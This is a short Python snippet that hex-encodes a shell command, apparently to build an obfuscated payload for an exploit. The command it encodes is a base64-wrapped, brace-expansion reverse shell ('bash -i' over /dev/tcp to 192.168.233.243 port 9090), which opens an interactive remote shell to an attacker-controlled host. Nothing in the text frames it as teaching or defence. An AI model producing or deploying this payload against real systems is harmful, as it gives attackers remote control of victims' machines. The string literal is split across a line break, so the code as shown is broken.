result = ""
target = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4y
NDMvOTA5MCAwPiYx}|{base64,-d}|{bash,-i}'
for x in target:
    result += hex(ord(x)) + ","
print(result.rstrip(','))
